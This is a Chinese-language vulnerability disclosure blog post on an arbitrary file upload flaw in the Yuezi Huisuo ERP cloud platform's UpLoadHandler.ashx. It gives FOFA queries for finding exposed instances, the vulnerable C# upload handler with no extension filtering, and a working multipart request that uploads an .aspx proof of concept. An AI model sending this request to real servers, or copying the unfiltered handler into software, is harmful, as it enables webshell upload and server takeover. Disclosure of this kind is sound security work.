---
title: "月子会所ERP管理云平台 UpLoadHandler.ashx 任意文件上传漏洞"
source: https://mrxn.net/jswz/mamabaohe-UpLoadHandler-rce.html
asset_dir: assets/月子会所erp管理云平台-uploadhandler.ashx-任意文件上传漏洞
---

# 月子会所ERP管理云平台 UpLoadHandler.ashx 任意文件上传漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/2/26 08:26
- 908浏览
- [0评论](#comment)
- 31分钟阅读

---

# 漏洞简介

月子会所ERP管理云平台是由武汉金同方科技有限公司研发团队结合行业月子中心相关企业需求开发的一套综合性管理[软件](#)。月子会所ERP管理云平台的 Page/BasicInfo/ashx/UpLoadHandler.ashx 接口存在[文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)漏洞，攻击者可利用该漏洞上传webshell获取服务器权限。

企业资源规划

# fofa语法

> `body="月子护理ERP管理平台" || body="妈妈宝盒客户端.rar" || body="Page/Login/Login3.aspx" || app="妈妈宝盒-ERP"`

# 漏洞分析

UpLoadHandler 的业务逻辑实现如下

```
public class UpLoadHandler : IHttpHandler
{

    public void ProcessRequest(HttpContext context)
    {
        context.Response.ContentType = "text/plain";
        HttpFileCollection flist = context.Request.Files;
        string UploadfileURLList = "";
        if (context.Request.Files.Count > 0)
        {
            for (int i = 0; i < context.Request.Files.Count; i++)
            {
                HttpPostedFile mypost = flist[i];
                //if (mypost.ContentLength > 0)
                //{

                string picneme = mypost.FileName;
                string tuozhanming = picneme.Substring(picneme.LastIndexOf(".")).ToLower();     //拓展名
                                                                                                //if (tuozhanming == ".xlsx" || tuozhanming == ".docx" || tuozhanming == ".doc" || tuozhanming == ".xls")
                                                                                                //{
                string newname = GetNewName(tuozhanming);
                UploadfileURLList += newname + "|";
                string uploadUrl = ConfigurationManager.AppSettings["UPLOAD_CONTACT_URL"];
                var uploadFileName = HttpContext.Current.Server.MapPath("../" + uploadUrl);
                if (!Directory.Exists(uploadFileName))
                {
                    Directory.CreateDirectory(uploadFileName);
                }
                mypost.SaveAs(context.Server.MapPath("../" + uploadUrl + newname));
                //mypost.SaveAs(context.Server.MapPath("../../../UploadfileURL/" + newname));
                System.Threading.Thread.Sleep(100);
                //}
                //}

            }
            UploadfileURLList = UploadfileURLList.Substring(0, UploadfileURLList.Length - 1);
        }
        context.Response.Write(UploadfileURLList);
    }

    public string GetNewName(string name)
    {
        string time = DateTime.Now.ToString("yy-MM-dd");
        string newname = time.Replace("-", "").Replace(" ", "").Replace(":", "").Replace("年", "").Replace("月", "").Replace("日", "").Replace("/", "");
        return newname + new Random().Next(0000000, 9999999) + name;
    }
```

上传路径由配置文件里的 UPLOAD\_CONTACT\_URL 决定，而它默认配置为 `UploadBaseFolder/Contact/` ，朴实无华的上传+常规的重命名等处理，并无特殊后缀过滤，且会**回显保存的文件名**，造成任意文件上传[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)。

# 漏洞复现

```
POST /Page/BasicInfo/ashx/UpLoadHandler.ashx HTTP/1.1
Host: mamabaohe.mrxn.net
Content-Type: multipart/form-data; boundary=--WebKitFormBoundaryWPL35TV23dfr1cNr

--WebKitFormBoundaryWPL35TV23dfr1cNr
Content-Disposition: form-data; name="file"; filename="t.aspx"

<%@Page Language="C#"%><%Response.Write(DateTime.Now.ToString());System.IO.File.Delete(Server.MapPath(Request.Url.AbsolutePath));%>
--WebKitFormBoundaryWPL35TV23dfr1cNr--
```

[![月子会所ERP管理云平台 UpLoadHandler.ashx 任意文件上传漏洞](images/img-001-cd9c1e391c96.webp)](https://image.mrxn.net/d007d912d9374d6188c097e755d22c1e.webp)

成功上传测试POC并回显文件名，因此上传后的文件访问路径： UploadBaseFolder/Contact/回显文件名

云存储

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#rce](https://mrxn.net/tag/rce)
- [#文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)
- [#asp.net](https://mrxn.net/tag/asp.net)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.fofa语法](#toc-2-)
- [3.漏洞分析](#toc-3-)
- [4.漏洞复现](#toc-4-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
